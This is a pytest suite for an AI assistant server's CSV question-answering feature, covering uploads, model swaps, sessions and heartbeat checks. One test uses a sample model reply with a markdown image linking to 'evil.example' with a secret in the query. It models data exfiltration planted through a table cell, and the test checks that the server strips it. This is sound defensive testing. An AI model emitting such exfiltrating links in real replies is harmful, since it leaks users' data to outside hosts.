"""Tests for step C5: CSV conversations through the server.

The real app runs (lifespan, middleware, the thread database, the answer graph with its CSV branch,
the real registry of sessions). Only the two things that need Ollama or pandas are fakes: the tables
(``csvkit.FakeCsv`` reads the uploaded file for real, so a header-only file fails to load, and
answers from a script) and the model swaps (a counter). So what is checked is the server's own
behaviour: what an upload does, which branch a thread takes, what is swapped when, what is kept and
forgotten, and that nothing blocks the event loop.
"""

import asyncio
import hashlib
import re
from collections.abc import Iterator
from pathlib import Path

import httpx
import pytest
from chatkit import REWRITE
from csvkit import CSV_MODEL, SALES, CsvFakes
from fastapi.testclient import TestClient
from serverkit import (
    Asked,
    ask,
    assert_heartbeat,
    ingest_note,
    make_app,
    ping_until_done,
    run_timed,
    upload_csv,
)

from geekbot.config import Settings
from geekbot.sse import parse_text

pytestmark = pytest.mark.usefixtures("clean_geekbot_env")

THREAD = "t-csv"
Q = "Which region sells the most?"
FOLLOW_UP = "And in March?"


@pytest.fixture
def client(tmp_path: Path) -> Iterator[TestClient]:
    with TestClient(make_app(tmp_path)) as opened:
        yield opened


def stages(asked: Asked) -> list[str]:
    """The ``stage`` of every ``status`` event of a stream, in order."""
    return [event.data["stage"] for event in asked.events if event.event == "status"]


def uploads(root: Path) -> list[Path]:
    folder = root / "data" / "uploads"
    return sorted(folder.iterdir()) if folder.is_dir() else []


# --- reserving a thread ----------------------------------------------------------------------------


def test_a_thread_can_be_reserved_for_a_csv_conversation_and_nothing_is_stored(
    client: TestClient,
) -> None:
    created = client.post("/v1/threads", json={"mode": "csv"})
    assert created.status_code == 201 and created.json()["mode"] == "csv"
    assert client.post("/v1/threads").json()["mode"] == "chat"  # no body: as before C5
    assert client.get("/v1/threads").json() == []
    assert client.get(f"/v1/threads/{created.json()['thread_id']}").status_code == 404


@pytest.mark.parametrize("body", [{"mode": "documents"}, {"mode": "csv", "extra": 1}])
def test_an_unknown_mode_or_option_is_422(client: TestClient, body: dict[str, object]) -> None:
    assert client.post("/v1/threads", json=body).status_code == 422


# --- the upload ------------------------------------------------------------------------------------


def test_an_upload_loads_the_table_and_says_what_it_found(
    client: TestClient, tmp_path: Path
) -> None:
    response = upload_csv(client, THREAD)
    assert response.status_code == 200
    body = response.json()
    assert (body["thread_id"], body["mode"], body["file"]) == (THREAD, "csv", "sales.csv")
    assert re.fullmatch(r"[0-9a-f]{16}-sales\.csv", body["stored_as"])
    assert (body["rows"], body["column_count"], body["columns"]) == (2, 2, ["region", "revenue"])
    assert (body["existed"], body["size_bytes"], body["notes"]) == (False, len(SALES), [])
    assert body["sha256"] == hashlib.sha256(SALES).hexdigest()
    assert body["memory_bytes"] == len(SALES)
    assert (tmp_path / "data" / "uploads" / body["stored_as"]).read_bytes() == SALES
    health = client.get("/v1/health").json()
    assert (health["csv_model"], health["csv_ready"], health["csv_sessions"]) == (
        CSV_MODEL,
        False,
        1,
    )


def test_the_same_file_again_is_one_stored_file_and_one_table(
    client: TestClient, tmp_path: Path
) -> None:
    upload_csv(client, THREAD)
    again = upload_csv(client, THREAD)
    assert again.json()["existed"] is True
    assert len(uploads(tmp_path)) == 1
    assert client.get("/v1/health").json()["csv_sessions"] == 1
    opened = client.app.state.fakes.csv.opened  # type: ignore[attr-defined]
    assert [table.closed for table in opened] == [True, False]  # the replaced table was let go


def test_a_wide_table_lists_the_first_columns_and_says_how_many_there_are(
    client: TestClient,
) -> None:
    names = [f"c{n}" for n in range(60)]
    data = (",".join(names) + "\n" + ",".join("1" for _ in names) + "\n").encode()
    body = upload_csv(client, THREAD, "wide.csv", data).json()
    assert body["column_count"] == 60 and body["columns"] == names[:40]


@pytest.mark.parametrize(
    ("thread", "name", "data", "status", "words"),
    [
        ("bad name", "a.csv", SALES, 422, "not a usable thread name"),
        (THREAD, "notes.txt", b"a\n", 415, "not accepted"),
        (THREAD, "empty.csv", b"", 422, "empty"),
        (THREAD, "header.csv", b"region,revenue\n", 422, "zero data rows"),
    ],
)
def test_a_file_that_cannot_be_used_is_refused_and_leaves_nothing_behind(
    client: TestClient,
    tmp_path: Path,
    thread: str,
    name: str,
    data: bytes,
    status: int,
    words: str,
) -> None:
    refused = upload_csv(client, thread, name, data)
    assert refused.status_code == status
    assert words in refused.json()["detail"]
    assert uploads(tmp_path) == []  # a file that was saved and then failed to load is deleted
    assert client.get("/v1/health").json()["csv_sessions"] == 0
    assert client.app.state.gate.busy is False  # type: ignore[attr-defined]


def test_a_table_over_the_memory_bound_is_refused_with_the_setting_to_change(
    tmp_path: Path,
) -> None:
    with TestClient(make_app(tmp_path, max_csv_bytes=10)) as client:
        refused = upload_csv(client, THREAD)
        assert refused.status_code == 413
        assert "GEEKBOT_CSV_SESSION_BUDGET_BYTES" in refused.json()["detail"]
        assert uploads(tmp_path) == []


def test_a_body_over_the_upload_cap_is_refused_before_it_is_read(tmp_path: Path) -> None:
    with TestClient(make_app(tmp_path, max_upload_bytes=20)) as client:
        assert upload_csv(client, THREAD).status_code == 413  # the perimeter's cap, set per route


def test_a_failed_replacement_keeps_the_conversations_table(tmp_path: Path) -> None:
    with TestClient(make_app(tmp_path)) as client:
        upload_csv(client, THREAD)
        assert upload_csv(client, THREAD, "header.csv", b"a,b\n").status_code == 422
        assert ask(client, THREAD, Q).names[-1] == "done"  # still the first file's table


def test_an_upload_to_a_chat_conversation_is_refused(client: TestClient, tmp_path: Path) -> None:
    ingest_note(client, tmp_path)
    assert ask(client, THREAD, "Where do zebras live?").names[-1] == "done"
    refused = upload_csv(client, THREAD)
    assert refused.status_code == 409
    assert "chat conversation" in refused.json()["detail"]
    assert uploads(tmp_path) == []  # refused before the bytes were saved


def test_an_upload_while_a_question_runs_is_refused_not_queued(client: TestClient) -> None:
    gate = client.app.state.gate  # type: ignore[attr-defined]
    token = gate.try_acquire("t-other")
    assert upload_csv(client, THREAD).status_code == 409
    gate.release(token)
    assert upload_csv(client, THREAD).status_code == 200


def test_a_server_with_no_csv_model_says_so(client: TestClient) -> None:
    client.app.state.answering.csv = None  # type: ignore[attr-defined]
    refused = upload_csv(client, THREAD)
    assert refused.status_code == 409 and "no CSV model" in refused.json()["detail"]
    asked = ask(client, THREAD, Q, mode="csv")
    assert asked.status == 409 and "no CSV model" in asked.body["detail"]


# --- asking ----------------------------------------------------------------------------------------


def test_a_csv_question_swaps_the_model_asks_the_table_and_answers_in_one_piece(
    client: TestClient,
) -> None:
    upload_csv(client, THREAD)
    asked = ask(client, THREAD, Q)
    assert asked.status == 200
    # The package answers whole, so there are no text pieces: the swap and "asking" are the progress.
    assert asked.names == ["meta", "status", "status", "done"]
    assert stages(asked) == ["loading_model", "asking"]
    assert asked.events[2].data == {"stage": "asking", "file": "sales.csv"}
    assert asked.data("meta") == {
        "thread_id": THREAD,
        "turn": 1,
        "mode": "csv",
        "model": CSV_MODEL,
        "think": False,
    }
    assert asked.data("status") == {"stage": "loading_model", "model": CSV_MODEL}
    done = asked.data("done")
    assert (done["mode"], done["model"]) == ("csv", CSV_MODEL)
    assert done["answer"].startswith("North leads with 520.") and "SELECT 1" in done["answer"]
    assert (done["csv_file"], done["csv_status"]) == ("sales.csv", "answered")
    assert (done["sources"], done["cited"], done["abstained"]) == ([], [], False)
    assert (done["labels"], done["tainted"]) == (["TOOL", "USER"], True)
    assert done["generation"] == {"seconds": 0.5, "load_seconds": 0.0}
    fakes = client.app.state.fakes  # type: ignore[attr-defined]
    assert (fakes.csv_loads, fakes.loads) == (["load"], [])
    assert fakes.csv.opened[0].questions == [Q]
    health = client.get("/v1/health").json()
    assert (health["chat_ready"], health["csv_ready"]) == (False, True)


def test_the_thread_is_saved_as_a_csv_conversation_with_its_reply_and_no_sources(
    client: TestClient,
) -> None:
    upload_csv(client, THREAD)
    done = ask(client, THREAD, Q).data("done")
    shown = client.get(f"/v1/threads/{THREAD}").json()
    assert (shown["mode"], shown["csv_file"]) == ("csv", "sales.csv")  # not the stored name
    assert (shown["turns"], shown["message_count"], shown["taint"]) == (1, 2, ["TOOL", "USER"])
    user, assistant = shown["messages"]
    assert user["content"] == Q and assistant["content"] == done["answer"]
    assert (assistant["sources"], assistant["cited"]) == ([], [])
    (summary,) = client.get("/v1/threads").json()
    assert (summary["mode"], summary["csv_file"]) == ("csv", "sales.csv")


def test_a_follow_up_is_rewritten_with_the_csv_model_and_the_table_gets_the_rewrite(
    client: TestClient,
) -> None:
    upload_csv(client, THREAD)
    ask(client, THREAD, Q)
    second = ask(client, THREAD, FOLLOW_UP)
    assert stages(second) == ["asking"]  # the CSV model is already on the GPU: no swap, no load
    assert second.data("done")["searched_as"] == REWRITE
    fakes = client.app.state.fakes  # type: ignore[attr-defined]
    assert len(fakes.csv_condenser.calls) == 1 and fakes.condenser.calls == []
    assert fakes.csv.opened[0].questions == [Q, REWRITE]
    assert fakes.csv_loads == ["load"]  # swapped once


def test_asking_in_an_uploaded_thread_without_saying_the_mode_is_a_csv_question(
    client: TestClient,
) -> None:
    upload_csv(client, THREAD)
    assert ask(client, THREAD, Q).data("meta")["mode"] == "csv"
    assert ask(client, "t-doc", "plain", mode="chat").data("meta")["mode"] == "chat"


def test_the_gpu_follows_the_mode_of_the_conversation(tmp_path: Path) -> None:
    with TestClient(make_app(tmp_path)) as client:
        ingest_note(client, tmp_path)
        fakes = client.app.state.fakes  # type: ignore[attr-defined]

        def residents() -> tuple[bool, bool]:
            health = client.get("/v1/health").json()
            return health["chat_ready"], health["csv_ready"]

        assert residents() == (True, False)  # the start-up warm-up loaded the chat model
        assert "status" not in ask(client, "t-doc", "Where do zebras live?").names
        upload_csv(client, THREAD)
        assert ask(client, THREAD, Q).data("status")["model"] == CSV_MODEL
        assert (fakes.loads, fakes.csv_loads, residents()) == ([], ["load"], (False, True))
        back = ask(client, "t-doc", "Where do zebras live?")
        assert back.data("status") == {"stage": "loading_model", "model": "fake-model:1b"}
        assert (fakes.loads, fakes.csv_loads, residents()) == (["load"], ["load"], (True, False))
        assert ask(client, THREAD, FOLLOW_UP).data("status")["model"] == CSV_MODEL
        assert (fakes.loads, fakes.csv_loads) == (["load"], ["load", "load"])


def test_after_a_restart_the_table_is_loaded_again_from_its_file(tmp_path: Path) -> None:
    with TestClient(make_app(tmp_path)) as first:
        upload_csv(first, THREAD)
        assert ask(first, THREAD, Q).names[-1] == "done"
    with TestClient(make_app(tmp_path)) as second:
        fakes = second.app.state.fakes  # type: ignore[attr-defined]
        assert fakes.csv.opened == []
        asked = ask(second, THREAD, FOLLOW_UP, mode="csv")
        assert stages(asked) == ["loading_model", "loading_file", "asking"]
        assert asked.events[2].data == {"stage": "loading_file", "file": "sales.csv"}
        assert len(fakes.csv.opened) == 1 and fakes.csv.opened[0].questions == [REWRITE]
        assert second.get(f"/v1/threads/{THREAD}").json()["message_count"] == 4


def test_a_table_the_registry_let_go_is_loaded_again_on_the_next_question(tmp_path: Path) -> None:
    with TestClient(make_app(tmp_path, max_csv_sessions=1)) as client:
        upload_csv(client, "t-a")
        ask(client, "t-a", Q)
        upload_csv(client, "t-b")  # room for one table: t-a's is closed
        fakes = client.app.state.fakes  # type: ignore[attr-defined]
        assert fakes.csv.opened[0].closed is True
        again = ask(client, "t-a", FOLLOW_UP)
        assert stages(again) == [
            "loading_file",
            "asking",
        ]  # the model is on the GPU; the table is not
        assert client.get("/v1/health").json()["csv_sessions"] == 1


# --- a conversation whose file the server does not hold ------------------------------------------------


def test_csv_asked_of_a_thread_with_no_file_is_refused_not_answered_from_the_documents(
    client: TestClient,
) -> None:
    refused = ask(client, "t-never", Q, mode="csv")
    assert refused.status == 409 and "upload the file again" in refused.body["detail"]
    assert client.app.state.gate.busy is False  # type: ignore[attr-defined]


def test_an_unsaved_thread_whose_table_was_closed_is_not_quietly_a_chat_one(
    tmp_path: Path,
) -> None:
    with TestClient(make_app(tmp_path, max_csv_sessions=1)) as client:
        upload_csv(client, "t-a")  # never asked: the server has nothing saved for it
        upload_csv(client, "t-b")  # t-a's table is closed
        refused = ask(client, "t-a", Q, mode="csv")  # what the UI sends for a CSV conversation
        assert refused.status == 409 and "upload the file again" in refused.body["detail"]


def test_the_mode_asked_for_must_agree_with_the_thread(client: TestClient, tmp_path: Path) -> None:
    ingest_note(client, tmp_path)
    assert ask(client, "t-doc", "Where do zebras live?").names[-1] == "done"
    wrong = ask(client, "t-doc", Q, mode="csv")
    assert wrong.status == 409 and "chat conversation" in wrong.body["detail"]
    upload_csv(client, THREAD)
    ask(client, THREAD, Q)
    wrong = ask(client, THREAD, Q, mode="chat")
    assert wrong.status == 409 and "csv conversation" in wrong.body["detail"]
    assert ask(client, THREAD, Q, mode="other").status == 422


# --- what a CSV reply may carry ---------------------------------------------------------------------------


def test_images_in_a_table_reply_never_reach_the_client(tmp_path: Path) -> None:
    """A cell of the file can hold an image whose address carries data out; G3 removes it."""
    reply = "North leads. ![x](http://evil.example/?q=secret)\n\n| region |\n|---|\n| North |"
    with TestClient(make_app(tmp_path, csv=CsvFakes(reply=reply))) as client:
        upload_csv(client, THREAD)
        done = ask(client, THREAD, Q).data("done")
        saved = client.get(f"/v1/threads/{THREAD}").json()["messages"][1]["content"]
    for shown in (done["answer"], saved):
        assert "evil.example" not in shown and "![" not in shown
        assert "| North |" in shown
    assert [item.split(":")[0] for item in done["removed_markup"]] == ["image"]


@pytest.mark.parametrize("status", ["abstained", "needs_clarification", "failed"])
def test_every_verdict_of_the_package_is_an_answer_the_user_reads(
    tmp_path: Path, status: str
) -> None:
    fakes = CsvFakes(reply="The data cannot say.", status=status)
    with TestClient(make_app(tmp_path, csv=fakes)) as client:
        upload_csv(client, THREAD)
        asked = ask(client, THREAD, Q)
    assert asked.names[-1] == "done"
    assert asked.data("done")["csv_status"] == status
    assert asked.data("done")["answer"] == "The data cannot say."


def test_a_table_that_raises_is_an_error_event_and_the_turn_and_the_table_are_released(
    tmp_path: Path,
) -> None:
    fakes = CsvFakes(error=RuntimeError("boom"))
    with TestClient(make_app(tmp_path, csv=fakes, max_csv_sessions=1)) as client:
        upload_csv(client, "t-a")
        failed = ask(client, "t-a", Q)
        assert failed.names == ["meta", "status", "status", "error"]
        assert stages(failed) == ["loading_model", "asking"]  # it failed after the question began
        message = failed.data("error")["message"]
        assert "the CSV analyst" in message and "boom" in message
        assert client.get("/v1/threads/t-a").status_code == 404  # nothing was answered
        assert client.app.state.gate.busy is False  # type: ignore[attr-defined]
        upload_csv(client, "t-b")  # t-a's table is not in use any more, so it can be closed
        assert fakes.opened[0].closed is True


# --- forgetting ------------------------------------------------------------------------------------------


def test_deleting_a_conversation_releases_its_table_and_keeps_the_file(
    client: TestClient, tmp_path: Path
) -> None:
    upload_csv(client, THREAD)
    ask(client, THREAD, Q)
    assert client.delete(f"/v1/threads/{THREAD}").status_code == 204
    assert client.get("/v1/health").json()["csv_sessions"] == 0
    assert client.app.state.fakes.csv.opened[0].closed is True  # type: ignore[attr-defined]
    assert len(uploads(tmp_path)) == 1  # the file stays: another upload of it would find it
    assert client.delete(f"/v1/threads/{THREAD}").status_code == 404


def test_a_thread_that_was_only_an_upload_can_be_deleted(client: TestClient) -> None:
    upload_csv(client, THREAD)
    assert client.delete(f"/v1/threads/{THREAD}").status_code == 204
    assert client.get("/v1/health").json()["csv_sessions"] == 0


def test_stopping_the_server_closes_every_table(tmp_path: Path) -> None:
    fakes = CsvFakes()
    with TestClient(make_app(tmp_path, csv=fakes)) as client:
        upload_csv(client, "t-a")
        upload_csv(client, "t-b")
        assert [table.closed for table in fakes.opened] == [False, False]
    assert [table.closed for table in fakes.opened] == [True, True]


def test_the_new_settings_have_their_documented_defaults() -> None:
    settings = Settings(_env_file=None)
    assert (settings.csv_max_sessions, settings.csv_session_budget_bytes) == (4, 500_000_000)


# --- the heartbeat (PLAN.md section 6.3) -----------------------------------------------------------------


def test_healthz_stays_fast_while_a_csv_question_runs(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    """The table blocks a worker thread for 2 s, as the real package does for seconds.

    If the question ran on the event loop, ``/healthz`` would wait for it. The first question (which
    swaps the model and opens the session) is a warm-up with the delay switched off. During the
    second, ``/healthz`` is asked back to back, 300 times or more (``serverkit.assert_heartbeat``
    says how the two signals work and why the window is that long).
    """
    fakes = CsvFakes()

    async def main() -> tuple[list[float], httpx.Response]:
        app = make_app(tmp_path, csv=fakes)
        async with app.router.lifespan_context(app):
            transport = httpx.ASGITransport(app=app)
            async with httpx.AsyncClient(transport=transport, base_url="http://test") as http:
                sent = await http.post(
                    "/v1/csv/upload",
                    params={"thread": THREAD, "filename": "sales.csv"},
                    content=SALES,
                    headers={"content-type": "application/octet-stream"},
                )
                assert sent.status_code == 200
                warm = await http.post(f"/v1/threads/{THREAD}/messages", json={"question": Q})
                assert parse_text(warm.text)[-1].event == "done"
                fakes.ask_delay_s = 2.0
                answering = asyncio.create_task(
                    http.post(f"/v1/threads/{THREAD}/messages", json={"question": FOLLOW_UP})
                )
                latencies = await ping_until_done(http, answering)
                return latencies, answering.result()

    latencies, response = run_timed(main, caplog)
    assert parse_text(response.text)[-1].event == "done"
    assert_heartbeat(latencies, caplog)


def test_healthz_stays_fast_while_a_table_loads(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    """Loading and profiling a table is blocking work: the upload runs it in a worker thread.

    The fake load blocks for 2 s; the heartbeat is checked as in the test above.
    """
    fakes = CsvFakes()

    async def main() -> tuple[list[float], httpx.Response]:
        app = make_app(tmp_path, csv=fakes)
        async with app.router.lifespan_context(app):
            transport = httpx.ASGITransport(app=app)
            async with httpx.AsyncClient(transport=transport, base_url="http://test") as http:
                fakes.open_delay_s = 2.0
                uploading = asyncio.create_task(
                    http.post(
                        "/v1/csv/upload",
                        params={"thread": THREAD, "filename": "sales.csv"},
                        content=SALES,
                        headers={"content-type": "application/octet-stream"},
                    )
                )
                latencies = await ping_until_done(http, uploading)
                return latencies, uploading.result()

    latencies, response = run_timed(main, caplog)
    assert response.status_code == 200
    assert_heartbeat(latencies, caplog)
